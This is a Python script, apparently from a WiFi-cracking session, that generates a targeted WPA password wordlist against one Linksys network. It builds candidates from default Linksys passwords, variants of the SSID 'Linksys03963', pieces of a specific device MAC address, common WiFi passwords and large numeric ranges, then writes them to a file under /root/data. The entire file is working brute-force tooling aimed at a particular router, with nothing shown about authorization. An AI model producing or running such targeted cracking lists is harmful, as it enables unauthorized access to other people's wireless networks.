#!/usr/bin/env python3
pws = set()

# Base passwords from Lifewire Linksys default table
base = ["admin","1admin","password","epicrouter","orion99","tivonpw",
        "1234","advanced","primus","public","test","unknown",
        "linksys","root","user","Admin","Password","LINKSYS","Linksys"]
pws.update(base)

# SSID-derived values
ssid_parts = ["03963","Linksys03963","linksys03963","LINKSYS03963",
              "3963","963","0396","039","03"]
pws.update(ssid_parts)

# Linksys + number combos
for n in ["03963","0396","039","03","1","2","3","123","1234","12345",
          "01","02","04","05","00","06","07","08","09","10"]:
    pws.add("linksys" + n)
    pws.add("Linksys" + n)
    pws.add("LINKSYS" + n)

# Common WiFi passwords (8+ chars)
common_wifi = [
    "password1","password123","password12","changeme","letmein1",
    "welcome1","internet","wireless","network1","connect1",
    "default1","router12","secure12","homewifi","wifipass",
    "12345678","123456789","1234567890","87654321","00000000",
    "11111111","99999999","88888888","12341234","abcdefgh",
    "qwertyui","asdfghjk","zxcvbnm1","iloveyou","trustno1",
    "sunshine","princess","football","baseball","passw0rd",
    "master12","access12","monkey12","dragon12","shadow12",
    "michael1","jennifer","superman","batman12","charlie1"
]
pws.update(common_wifi)

# 8-digit numeric patterns centered on 03963
for i in range(1000):
    s = str(i).zfill(3)
    pws.add("03963" + s)   # 03963000-03963999
    pws.add(s + "03963")   # 00003963-99903963
    pws.add("39630" + s)   # 39630000-39630999
    pws.add("96303" + s)   # 96303000-96303999
    pws.add("63039" + s)   # 63039000-63039999
    pws.add("30396" + s)   # 30396000-30396999

# MAC-derived: device MAC was 34:64:A9:66:AB:03
mac_parts = ["3464a966","66ab0334","a966ab03","3464A966","66AB0334","A966AB03",
             "ab033464","AB033464","34:64:A9","3464a9","66ab03"]
pws.update(mac_parts)

# Common Linksys default WiFi formats (some models use these patterns)
for i in range(10000):
    s = str(i).zfill(4)
    pws.add("Link" + s)     # Link0000-Link9999
    pws.add("link" + s)

# Filter: WPA requires 8-63 chars
valid = sorted([p for p in pws if 8 <= len(p) <= 63])

with open("/root/data/linksys_wifi_wordlist.txt", "w") as f:
    for p in valid:
        f.write(p + "\n")

print(f"Total WPA-valid passwords: {len(valid)}")
